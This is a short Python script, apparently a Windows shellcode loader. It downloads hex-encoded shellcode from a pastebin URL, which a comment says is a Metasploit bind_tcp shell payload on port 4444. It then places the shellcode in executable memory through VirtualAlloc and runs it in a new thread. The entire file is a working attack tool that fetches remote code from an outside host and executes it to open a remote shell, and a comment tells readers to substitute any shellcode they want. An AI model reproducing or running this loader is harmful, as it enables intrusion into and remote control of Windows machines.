#!/usr/bin/env python3

import urllib.request
from ctypes import *

URL = "http://pastebin.com/raw.php?i=48k0BXpq"  # msfpayload windows/shell/bind_tcp LPORT=4444
# Modify that URL for whatever shellcode you want

with urllib.request.urlopen(URL) as downloader:
    paste = downloader.read()

alphanumeric = paste.replace(b"\r\n", b"")
shellcode = bytearray.fromhex(alphanumeric)

# Windows API function prototypes
kernel32 = windll.kernel32
PAGE_EXECUTE_READWRITE = 0x40
PROCESS_ALL_ACCESS = 0x1F0FFF
VIRTUAL_MEM = (0x1000 | 0x2000)

# Allocate memory for shellcode
mem_ptr = kernel32.VirtualAlloc(c_int(0), c_int(len(shellcode)), c_int(VIRTUAL_MEM), c_int(PAGE_EXECUTE_READWRITE))

# Copy shellcode to allocated memory
kernel32.RtlMoveMemory(c_int(mem_ptr), shellcode, c_int(len(shellcode)))

# Create a new thread for shellcode execution
thread_id = c_ulong(0)
kernel32.CreateThread(c_int(0), c_int(0), c_int(mem_ptr), c_int(0), c_int(0), pointer(thread_id))

# Wait for the thread to finish execution
kernel32.WaitForSingleObject(c_int(thread_id), c_int(-1))
